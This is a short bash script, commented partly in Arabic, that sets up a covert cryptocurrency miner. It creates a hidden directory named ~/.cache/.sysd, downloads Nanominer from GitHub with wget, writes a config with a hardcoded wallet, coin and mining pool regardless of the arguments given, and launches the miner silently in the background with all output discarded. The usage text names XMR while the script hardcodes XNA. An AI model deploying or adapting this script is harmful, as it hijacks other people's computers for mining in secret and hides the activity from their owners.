#!/bin/bash
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"
# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --wallet) wallet="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"; shift ;;
        --coin) coin="XNA"; shift ;;
        --pool) pool="ethash.eu.mine.zergpool.com:9999"; shift ;;
        --email) email="$2"; shift ;;
    esac
    shift
done

if [ -z "$wallet" ] || [ -z "$coin" ] || [ -z "$pool" ]; then
    echo "Usage: $0 --wallet YOUR_WALLET --coin XMR --pool pool:port [--email youremail]"
    exit 1
fi

# Download Nanominer if not present
if [ ! -d "nanominer-linux" ]; then
    echo "[+] Downloading Nanominer..."
    wget -q https://github.com/nanopool/nanominer/releases/download/v3.10.0/nanominer-linux-3.10.0.tar.gz
    tar -xvf nanominer-linux-3.10.0.tar.gz
    cd nanominer-linux || exit 1
else
    cd nanominer-linux || exit 1
fi

# Create config.ini
cat <<EOL > config.ini
wallet=NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT
coin=XNA
pool=ethash.eu.mine.zergpool.com:9999
email=$email
EOL

# Run Nanominer silently in background
nohup ./nanominer > /dev/null 2>&1 &
echo "[+] Nanominer started in background (hidden)."
